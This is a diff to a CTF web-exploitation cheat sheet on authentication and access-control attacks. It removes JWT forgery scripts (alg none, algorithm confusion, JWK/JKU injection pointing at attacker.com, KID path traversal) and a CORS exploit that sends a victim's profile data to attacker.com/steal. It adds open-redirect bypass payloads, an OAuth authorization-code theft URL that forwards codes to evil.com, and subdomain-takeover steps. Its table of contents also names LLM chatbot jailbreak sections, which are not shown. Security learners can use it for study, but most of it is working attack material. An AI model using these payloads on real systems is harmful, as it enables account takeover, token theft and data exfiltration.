@@ -1,16 +1,6 @@
 # CTF Web - Auth & Access Control Attacks
 
 ## Table of Contents
-- [JWT Attacks](#jwt-attacks)
-  - [Algorithm None](#algorithm-none)
-  - [Algorithm Confusion (RS256 → HS256)](#algorithm-confusion-rs256-hs256)
-  - [Weak Secret Brute-Force](#weak-secret-brute-force)
-  - [Unverified Signature (Crypto-Cat)](#unverified-signature-crypto-cat)
-  - [JWK Header Injection (Crypto-Cat)](#jwk-header-injection-crypto-cat)
-  - [JKU Header Injection (Crypto-Cat)](#jku-header-injection-crypto-cat)
-  - [KID Path Traversal (Crypto-Cat)](#kid-path-traversal-crypto-cat)
-  - [JWT Balance Replay (MetaShop Pattern)](#jwt-balance-replay-metashop-pattern)
-  - [JWE Token Forgery with Exposed Public Key (UTCTF 2026)](#jwe-token-forgery-with-exposed-public-key-utctf-2026)
 - [Password/Secret Inference from Public Data](#passwordsecret-inference-from-public-data)
 - [Weak Signature/Hash Validation Bypass](#weak-signaturehash-validation-bypass)
 - [Client-Side Access Gate Bypass](#client-side-access-gate-bypass)
@@ -30,152 +20,10 @@
 - [HTTP TRACE Method Bypass (BYPASS CTF 2025)](#http-trace-method-bypass-bypass-ctf-2025)
 - [LLM/AI Chatbot Jailbreak (BYPASS CTF 2025)](#llmai-chatbot-jailbreak-bypass-ctf-2025)
 - [LLM Jailbreak with Safety Model Category Gaps (UTCTF 2026)](#llm-jailbreak-with-safety-model-category-gaps-utctf-2026)
-- [OAuth/OIDC Exploitation](#oauthoidc-exploitation)
-  - [Open Redirect Token Theft](#open-redirect-token-theft)
-  - [OIDC ID Token Manipulation](#oidc-id-token-manipulation)
-  - [OAuth State Parameter CSRF](#oauth-state-parameter-csrf)
-- [CORS Misconfiguration](#cors-misconfiguration)
+- [Open Redirect Chains](#open-redirect-chains)
+- [Subdomain Takeover](#subdomain-takeover)
 
----
-
-## JWT Attacks
-
-### Algorithm None
-Remove signature, set `"alg": "none"` in header.
-
-### Algorithm Confusion (RS256 → HS256)
-App accepts both RS256 and HS256, uses public key for both:
-```javascript
-const jwt = require('jsonwebtoken');
-const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
-const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
-```
-
-### Weak Secret Brute-Force
-```bash
-flask-unsign --decode --cookie "eyJ..."
-hashcat -m 16500 jwt.txt wordlist.txt
-```
-
-### Unverified Signature (Crypto-Cat)
-Server decodes JWT without verifying the signature. Modify payload claims and re-encode with the original (unchecked) signature:
-```python
-import jwt, base64, json
-
-token = "eyJ..."
-parts = token.split('.')
-payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
-payload['sub'] = 'administrator'
-new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
-forged = f"{parts[0]}.{new_payload}.{parts[2]}"
-```
-**Key insight:** Some JWT libraries have separate `decode()` (no verification) and `verify()` functions. If the server uses `decode()` only, the signature is never checked.
-
-### JWK Header Injection (Crypto-Cat)
-Server accepts JWK (JSON Web Key) embedded in JWT header without validation. Sign with attacker-generated RSA key, embed matching public key:
-```python
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.backends import default_backend
-import jwt, base64
-
-private_key = rsa.generate_private_key(65537, 2048, default_backend())
-public_numbers = private_key.public_key().public_numbers()
-
-jwk = {
-    "kty": "RSA",
-    "kid": original_header['kid'],
-    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode(),
-    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()
-}
-forged = jwt.encode({"sub": "administrator"}, private_key, algorithm='RS256', headers={'jwk': jwk})
-```
-**Key insight:** Server extracts the public key from the token itself instead of using a stored key. Attacker controls both the key and the signature.
-
-### JKU Header Injection (Crypto-Cat)
-Server fetches public key from URL specified in JKU (JSON Key URL) header without URL validation:
-```python
-# 1. Host JWKS at attacker-controlled URL
-jwks = {"keys": [attacker_jwk]}  # POST to webhook.site or attacker server
-
-# 2. Forge token pointing to attacker JWKS
-forged = jwt.encode(
-    {"sub": "administrator"},
-    attacker_private_key,
-    algorithm='RS256',
-    headers={'jku': 'https://attacker.com/.well-known/jwks.json'}
-)
-```
-**Key insight:** Combines SSRF with token forgery. Server makes an outbound request to fetch the key, trusting whatever URL the token specifies.
-
-### KID Path Traversal (Crypto-Cat)
-KID (Key ID) header used in file path construction for key lookup. Point to predictable file:
-```python
-# /dev/null returns empty bytes -> HMAC key is empty string
-forged = jwt.encode(
-    {"sub": "administrator"},
-    '',  # Empty string as secret
-    algorithm='HS256',
-    headers={"kid": "../../../dev/null"}
-)
-```
-**Variants:**
-- `../../../dev/null` → empty key
-- `../../../proc/sys/kernel/hostname` → predictable key content
-- SQL injection in KID: `' UNION SELECT 'known-secret' --` (if KID queries a database)
-
-**Key insight:** KID is meant to select which key to use for verification. When used in file paths or SQL queries without sanitization, it becomes an injection vector.
-
-### JWT Balance Replay (MetaShop Pattern)
-1. Sign up → get JWT with balance=$100 (save this JWT)
-2. Buy items → balance drops to $0
-3. Replace cookie with saved JWT (balance back to $100)
-4. Return all items → server adds prices to JWT's $100 balance
-5. Repeat until balance exceeds target price
-
-**Key insight:** Server trusts the balance in the JWT for return calculations but doesn't cross-check purchase history.
-
-### JWE Token Forgery with Exposed Public Key (UTCTF 2026)
-
-**Pattern (Break the Bank):** Application uses JWE (JSON Web Encryption) tokens instead of JWT. Public RSA key is exposed (e.g., via `/api/key`, `.well-known/jwks.json`, or in page source). Server decrypts JWE tokens with its private key — attacker encrypts forged claims with the public key.
-
-**Key difference from JWT:** JWE tokens are **encrypted** (confidential), not just signed. The server decrypts them. If you have the public key, you can encrypt arbitrary claims that the server will trust.
-
-```python
-from jwcrypto import jwk, jwe
-import json
-
-# 1. Fetch the server's public key
-# GET /api/key or extract from JWKS endpoint
-public_key_pem = """-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkq...
------END PUBLIC KEY-----"""
-
-# 2. Create JWK from public key
-key = jwk.JWK.from_pem(public_key_pem.encode())
-
-# 3. Forge claims (e.g., set balance to 999999)
-forged_claims = {
-    "sub": "attacker",
-    "balance": 999999,
-    "role": "admin"
-}
-
-# 4. Encrypt with server's public key
-token = jwe.JWE(
-    json.dumps(forged_claims).encode(),
-    recipient=key,
-    protected=json.dumps({
-        "alg": "RSA-OAEP-256",  # or RSA-OAEP, RSA1_5
-        "enc": "A256GCM"         # or A128CBC-HS256
-    })
-)
-forged_jwe = token.serialize(compact=True)
-# 5. Send forged token as cookie/header
-```
-
-**Detection:** Token has 5 base64url segments separated by dots (JWE compact format: header.enckey.iv.ciphertext.tag) vs. JWT's 3 segments. Endpoints that expose RSA public keys.
-
-**Key insight:** JWE encryption ≠ authentication. If the server trusts any token it can decrypt without additional signature verification, exposing the public key lets you forge arbitrary claims. Look for public key endpoints and try encrypting modified payloads.
+For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For OAuth/OIDC, SAML, CI/CD credential theft, and infrastructure auth attacks, see [auth-infra.md](auth-infra.md).
 
 ---
 
@@ -624,96 +472,90 @@ def extract_via_code(host, port):
 
 ---
 
-## OAuth/OIDC Exploitation
+### Open Redirect Chains
 
-### Open Redirect Token Theft
-```python
-# OAuth authorization with redirect_uri manipulation
-# If redirect_uri validation is weak, steal tokens via open redirect
-import requests
+**Pattern:** Chain open redirects for OAuth token theft, phishing, or SSRF bypass. Test all redirect parameters for open redirect, then chain with OAuth flows.
 
-# Step 1: Craft malicious authorization URL
-auth_url = "https://target.com/oauth/authorize"
-params = {
-    "client_id": "legitimate_client",
-    "redirect_uri": "https://target.com/callback/../@attacker.com",  # path traversal
-    "response_type": "code",
-    "scope": "openid profile"
-}
-# Victim clicks → auth code sent to attacker's server
+```bash
+# Common redirect parameters to test
+# ?redirect=, ?url=, ?next=, ?return=, ?returnTo=, ?continue=, ?dest=, ?go=
 
-# Common redirect_uri bypasses:
-# https://target.com/callback?next=https://evil.com
-# https://target.com/callback/../@evil.com
-# https://target.com/callback%23@evil.com  (fragment)
-# https://target.com/callback/.evil.com
-# https://target.com.evil.com  (subdomain)
+# Bypass techniques for redirect validation:
+https://evil.com@target.com          # URL authority confusion
+https://target.com.evil.com          # Subdomain of attacker domain
+//evil.com                           # Protocol-relative URL
+/\evil.com                           # Backslash (nginx normalizes to //evil.com)
+/%0d%0aLocation:%20http://evil.com   # CRLF injection in redirect header
+https://target.com%00@evil.com       # Null byte truncation
+https://target.com?@evil.com         # Query string as authority
+/redirect?url=https://evil.com       # Double redirect chain
 ```
 
-### OIDC ID Token Manipulation
+**OAuth token theft via open redirect:**
 ```python
-# If server accepts unsigned tokens (alg: none)
-import jwt, json, base64
-
-token = "eyJ..."  # captured ID token
-header, payload, sig = token.split(".")
-# Decode and modify
-payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
-payload_data["sub"] = "admin"
-payload_data["email"] = "admin@target.com"
-
-# Re-encode with alg:none
-new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
-new_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=")
-forged = f"{new_header.decode()}.{new_payload.decode()}."
+# 1. Find open redirect on target.com (e.g., /redirect?url=ATTACKER)
+# 2. Use it as redirect_uri in OAuth flow
+auth_url = (
+    "https://auth.target.com/authorize?"
+    "client_id=legit_client&"
+    "redirect_uri=https://target.com/redirect?url=https://evil.com&"
+    "response_type=code&scope=openid"
+)
+# Victim clicks → auth code sent to target.com/redirect → forwarded to evil.com
 ```
 
-### OAuth State Parameter CSRF
-```python
-# Missing or predictable state parameter allows CSRF
-# Attacker initiates OAuth flow, captures callback URL with auth code
-# Sends callback URL to victim → victim's session linked to attacker's OAuth account
+**Key insight:** Open redirects alone are often "informational" severity, but chained with OAuth they become critical. Always test redirect_uri with open redirect endpoints on the same domain — OAuth providers often only validate the domain, not the full path.
 
-# Detection: Check if state parameter is:
-# 1. Present in authorization request
-# 2. Validated on callback
-# 3. Bound to user session (not just random)
-```
-
-**Key insight:** OAuth/OIDC attacks typically target redirect_uri validation (open redirect → token theft), token manipulation (alg:none, JWKS injection), or state parameter CSRF. Always test redirect_uri with path traversal, fragment injection, and subdomain tricks.
+**Detection:** Parameters named `redirect`, `url`, `next`, `return`, `continue`, `dest`, `goto`, `forward`, `rurl`, `target` in any endpoint. 3xx responses that reflect user input in the Location header.
 
 ---
 
-## CORS Misconfiguration
+### Subdomain Takeover
 
-```python
-# Test for reflected Origin
-import requests
+**Pattern:** DNS CNAME points to an external service (GitHub Pages, Heroku, AWS S3, Azure, etc.) where the resource has been deleted. Attacker claims the resource on the external service, serving content on the victim's subdomain.
 
-targets = [
-    "https://evil.com",
-    "https://target.com.evil.com",
-    "null",
-    "https://target.com%60.evil.com",
-]
+```bash
+# Step 1: Enumerate subdomains
+subfinder -d target.com -silent | httpx -silent -status-code -title
 
-for origin in targets:
-    r = requests.get("https://target.com/api/sensitive",
-                     headers={"Origin": origin})
-    acao = r.headers.get("Access-Control-Allow-Origin", "")
-    acac = r.headers.get("Access-Control-Allow-Credentials", "")
-    if origin in acao or acao == "*":
-        print(f"[!] Reflected: {origin} -> ACAO: {acao}, ACAC: {acac}")
+# Step 2: Check for dangling CNAMEs
+dig CNAME suspicious-subdomain.target.com
+# If CNAME points to: *.herokuapp.com, *.github.io, *.s3.amazonaws.com,
+# *.azurewebsites.net, *.cloudfront.net, *.pantheonsite.io, etc.
+# AND the target returns 404/NXDOMAIN → potential takeover
+
+# Step 3: Verify vulnerability
+# Tool: can-i-take-over-xyz reference list
+curl -v https://suspicious-subdomain.target.com
+# Look for: "There isn't a GitHub Pages site here", "NoSuchBucket",
+# "No such app", "herokucdn.com/error-pages/no-such-app"
 ```
 
-```javascript
-// Exploit: steal data via CORS misconfiguration
-// Host on attacker server, victim visits this page
-fetch('https://target.com/api/user/profile', {
-    credentials: 'include'
-}).then(r => r.json()).then(data => {
-    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
-});
+**Exploitation:**
+```bash
+# GitHub Pages example:
+# 1. CNAME: blog.target.com → targetorg.github.io (repo deleted)
+# 2. Create GitHub repo "targetorg.github.io" (or any repo with GitHub Pages)
+# 3. Add CNAME file with content: blog.target.com
+# 4. Now blog.target.com serves your content → phishing, cookie theft, XSS
+
+# S3 bucket example:
+# 1. CNAME: assets.target.com → target-assets.s3.amazonaws.com (bucket deleted)
+# 2. Create S3 bucket named "target-assets"
+# 3. Upload malicious content
 ```
 
-**Key insight:** CORS is exploitable when `Access-Control-Allow-Origin` reflects the `Origin` header AND `Access-Control-Allow-Credentials: true`. Check for subdomain matching (`*.target.com` accepts `evil-target.com`), null origin acceptance (`sandbox` iframe), and prefix/suffix matching bugs.
+**Key insight:** Subdomain takeover gives you full control of a subdomain on the target's domain. This means you can: set cookies for `*.target.com` (cookie tossing), bypass same-origin policy, host convincing phishing pages, and potentially steal OAuth tokens if the subdomain is in the allowed redirect_uri list.
+
+**Fingerprints (common external services):**
+
+| Service | CNAME Pattern | Takeover Signal |
+|---------|--------------|-----------------|
+| GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here" |
+| Heroku | `*.herokuapp.com` | "No such app" |
+| AWS S3 | `*.s3.amazonaws.com` | "NoSuchBucket" |
+| Azure | `*.azurewebsites.net` | "404 Web Site not found" |
+| Shopify | `*.myshopify.com` | "Sorry, this shop is currently unavailable" |
+| Fastly | CNAME to Fastly | "Fastly error: unknown domain" |
+
+**Tools:** `subjack`, `nuclei -t takeovers/`, `can-i-take-over-xyz` (reference list)
